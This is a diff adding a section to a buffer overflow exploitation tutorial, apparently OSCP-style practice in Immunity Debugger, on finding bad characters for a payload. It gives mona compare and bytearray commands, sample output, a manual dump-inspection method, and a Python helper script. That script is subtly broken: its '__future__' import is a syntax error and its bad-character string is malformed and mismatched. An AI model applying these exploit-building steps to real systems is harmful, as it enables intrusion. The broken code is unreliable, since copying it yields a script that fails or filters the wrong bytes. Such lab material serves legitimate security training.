@@ -225,9 +225,68 @@ payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\
 postfix = ""
 ```
 
-Now, restart the Immunity Debugger and run this exploit.
+Now, restart the Immunity Debugger and run this exploit. Then, to spot the bad characters, we can follow 2 ways.
 
+- Method 1; take the ``ESP`` address and run the following ``mona`` script:
 
+```
+!mona compare -f c:\mona\oscp\bytearray.bin -a <ESP_ADDRESS>
+```
+
+After running this, mona will tell us the possible bad chars for our payload.
+
+In our case:
+
+```
+!mona compare -f c:\mona\oscp\bytearray.bin -a 01B1FA30
+```
+
+Output:
+
+```
+...
+Possibly bad chars: 07 2E A0
+Bytes omitted from input: 00
+...
+```
+
+We need to repeat same process until we don't see any badchars.
+
+##
+
+- Method 2; right-click to ``ESP`` in Immunity Debugger, select ``Follow In Dump``. And from the lower-left table, notice unreadable funny characters and omit them from your payload.
+
+Continue from **Method - 1**, run updated ``mona`` command after finding new bad chars:
+
+```
+!mona bytearray -b "\x00\x07\x2e\xa0"
+```
+
+Also, update the payload variable with the new generated bad chars using previous script:
+
+```
+#!/usr/bin/env python3
+
+from __future__ import print function
+
+list = "\\0x7\\x2e\\xa0".split("\\x")
+
+for x in range(1, 256):
+  if "{:02x}".format(x) not in list:
+    print("\\x" + "{:02x}".format(x), end='')
+
+print()
+```
+
+Now, do:
+
+```
+!mona compare -f c:\mona\oscp\bytearray.bin -a <ESP_ADDRESS>
+```
+
+Then, repeat ``!mona bytearray -b "<BADCHARS>"`` until you have no badchars.
+
+## Finding a Jump Point
 
 
 
